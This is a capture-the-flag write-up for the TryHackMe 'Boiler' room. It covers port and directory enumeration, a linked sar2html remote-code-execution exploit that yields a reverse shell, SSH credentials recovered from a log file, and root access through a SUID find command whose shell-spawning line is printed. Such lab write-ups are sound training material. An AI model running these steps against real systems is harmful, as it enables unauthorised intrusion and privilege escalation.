#  TryHackMe - Boiler CTF Write-up

##  Room Info
- **Name:** Boiler CTF  
- **Difficulty:** Easy  
- **Date Completed:** 10.09.2025  
- **Target IP:** xxx.xxx.xxx.xxx  

---

##  Enumeration

### Nmap Scan
First, I performed a full port scan:

```bash
sudo nmap -sV -sC -Pn -p- xxx.xxx.xxx.xxx
```

**Results:**
- 21/tcp → FTP (nothing useful)  
- 80/tcp → HTTP  
- 10000/tcp → MiniServ v1.930  
- 55007/tcp → SSH  

---

##  Web Enumeration
Checking port 80, I found a website. Using **ffuf**, I discovered multiple directories:

```bash
ffuf -u http://xxx.xxx.xxx.xxx/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Interesting directories:
- `/joomal` (Joomla site)  
- `/joomal/manual`  
- `/joomal/administrator`  
- `/joomal/_file`  
- `/joomal/_test` → running **sar2html v3.2.1**  

On port **10000**, I found **MiniServ v1.930**, but no working exploit was available.

---

##  Exploitation
`sar2html v3.2.1` is vulnerable to **RCE**.  
I used this public exploit: [sar2HTML_exploit](https://github.com/Jsmoreira02/sar2HTML_exploit)

Result: I obtained a reverse shell as **www-data**.

During enumeration, I found a file `log.txt` both on the website and inside the shell.  
It contained valid SSH credentials:

```
User: basterd
Password: superduperp@$$
```

---

##  SSH Access
Logged in via SSH:

```bash
ssh basterd@xxx.xxx.xxx.xxx -p 55007
```

---

##  Privilege Escalation
I searched for SUID binaries:

```bash
find / -user root -perm -4000 -type f 2>/dev/null
```

Exploitable binary: **find**

I escalated privileges using:

```bash
find . -exec /bin/bash -p \; -quit
```

Result: **root shell obtained** 

---

##  Root Flag
```bash
cat /root/root.txt
```

Flag successfully captured 

---

##  Conclusion
- Entry point: **sar2html v3.2.1 RCE**  
- Credential discovery via `log.txt` → SSH access  
- Privilege escalation via SUID `find` binary  
- Root flag captured  

**Boiler CTF pwned!** 

---
